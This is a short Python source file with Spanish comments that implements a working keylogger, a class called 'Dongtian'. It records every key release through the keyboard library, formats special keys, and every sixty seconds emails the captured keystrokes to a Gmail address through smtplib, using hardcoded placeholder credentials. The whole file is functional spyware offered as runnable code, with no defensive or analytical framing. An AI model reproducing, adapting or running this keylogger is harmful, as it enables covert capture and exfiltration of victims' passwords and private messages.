import keyboard
import smtplib
from threading import Semaphore, Timer

ENVIAR_REPORTE = 60 
DIRECCION_GMAIL = "direcciondecorreo@gmail.com"
PASSWORD_GMAIL = "Contraseña123"

class Dongtian:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)
        
    def callback(self, event):
        
        name = event.name
        if len(name) > 1:
            # caracter excluido, teclas especiales (ej. ctrl, alt, etc.)
            # uppercase con []
            if name == "space":
                name = " "
            elif name == "enter":
                # Cuando ENTER es presionado, se agrega otra linea
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # reemplaza los espacios con underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
        
    def enviar_gmail(self, email, password, message):
            
        # conexion a un SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # conexion al SMTP server como el modo TLS  ( por seguridad )
        server.starttls()
        # entra las credenciales del gmail
        server.login(email, password)
        # envia el mensaje
        server.sendmail(email, email, message)
        # termina la sesion con el server
        server.quit()

    def reportar(self):
        
        if self.log:
            self.enviar_gmail(DIRECCION_GMAIL, PASSWORD_GMAIL, self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.reportar).start()

    def start(self):
        # inicia el keylogger
        keyboard.on_release(callback=self.callback)
        self.reportar()
        self.semaphore.acquire()

if __name__ == "__main__":
    dongtian = Dongtian(interval=ENVIAR_REPORTE)
    dongtian.start()
